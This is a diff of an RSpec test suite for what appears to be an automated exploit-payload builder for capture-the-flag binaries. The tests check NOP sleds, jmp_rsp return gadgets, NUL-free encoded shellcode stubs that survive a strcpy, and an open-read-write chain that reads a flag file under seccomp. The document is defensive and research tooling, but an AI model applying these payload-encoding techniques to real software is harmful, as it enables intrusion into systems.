@@ -27,7 +27,7 @@ RSpec.describe Lictor::PayloadBuilder do
     expect(body).to eq(("A" * 16).b + [4_196_182].pack("Q<"))
   end
 
-  it "builds the shellcode payload: sled + jmp_rsp + the assembled shellcode" do
+  it "builds the shellcode payload: sled + jmp_rsp + the encoded stub" do
     facts = "nx(\"false\").\ngadget(\"jmp_rsp\", 4196200).\n"
     result = described_class.build(binary: binary, facts: facts, technique: "shellcode", out: out)
     expect(result[:ret_source]).to include("gadget:jmp_rsp")
@@ -35,16 +35,31 @@ RSpec.describe Lictor::PayloadBuilder do
     expect(body).to start_with(("\x90" * result[:offset]).b)
     expect(body.bytesize).to be > result[:offset] + 8
     expect(result[:size]).to eq(body.bytesize)
+    # the shellcode travels through a strcpy: everything AFTER the
+    # return slot (the decoder + the encoded stub) must cross the
+    # channel NUL-free - a NUL there ends the copy before the payload
+    after_ret = body[(result[:offset] + 8)..]
+    expect(after_ret).not_to include("\x00".b)
   end
 
-  it "uses a custom payload file verbatim for the shellcode template" do
+  it "encodes a custom payload file so it crosses the strcpy channel" do
     custom = File.join(dir, "custom.sc")
     File.binwrite(custom, "\xcc" * 11)
     facts = "gadget(\"jmp_rsp\", 99).\n"
     described_class.build(binary: binary, facts: facts, technique: "shellcode",
       out: out, payload_file: custom)
     body = File.binread(out)
-    expect(body).to end_with(("\xcc" * 11).b)
+    # the raw 0xcc bytes carry no NUL, but the channel rule is uniform:
+    # the body after the return slot is the ENCODED form (the decoder +
+    # the keyed data), NUL-free whatever the input contained
+    after_ret = body[(result_offset(body)) + 8..]
+    expect(after_ret).not_to include("\x00".b)
+  end
+
+  def result_offset(body)
+    # the sled ends where the first non-0x90 byte sits (the gadget's
+    # qword); the tests build a 0x90 sled of the measured offset
+    body.bytes.index { |b| b != 0x90 } || 0
   end
 
   it "refuses honestly when the facts cannot drive the template" do
@@ -185,8 +200,11 @@ RSpec.describe Lictor::PayloadBuilder, "the orw shellcode slot" do
     result = described_class.build(binary: binary, facts: facts, technique: "orw",
       out: out, shellcode_path: flag)
     body = File.binread(out)
-    # the orw stub embeds the flag path and the read marker
-    expect(body).to include("flag.txt")
+    # the path rides ENCODED (the strcpy channel): the body after the
+    # return slot must cross it NUL-free; the live runner below proves
+    # the decoded stub reads the flag
+    after_ret = body[(result[:offset] + 8)..]
+    expect(after_ret).not_to include("\x00".b)
     expect(result[:ret_source]).to include("leaked_address:input@4196300")
     # live: run the stub, it prints the flag
     runner = File.join(dir, "sc_runner")
@@ -212,9 +230,13 @@ RSpec.describe Lictor::PayloadBuilder, "seccomp-aware shellcode" do
   it "execve dies under seccomp: the sh stub becomes the orw chain" do
     out = File.join(dir, "p.bin")
     facts = "nx(\"false\").\nseccomp(\"true\").\ngadget(\"jmp_rsp\", 4196200).\n"
-    described_class.build(binary: binary, facts: facts, technique: "shellcode", out: out)
+    result = described_class.build(binary: binary, facts: facts, technique: "shellcode", out: out)
     body = File.binread(out)
+    # the executed region starts at ret_slot+8 (the jmp_rsp lands the
+    # decode there): that region must cross the strcpy channel NUL-free;
+    # the return slot's own NULs are completed by the original stack
+    after_ret = body[(result[:offset] + 8)..]
     expect(body).not_to include("/bin/sh"), "the sh stub execve's into a killed process under seccomp"
-    expect(body).to include("flag.txt"), "the orw stub reads the flag: the path is embedded"
+    expect(after_ret).not_to include("\x00".b), "the orw stub crosses the strcpy channel NUL-free"
   end
 end
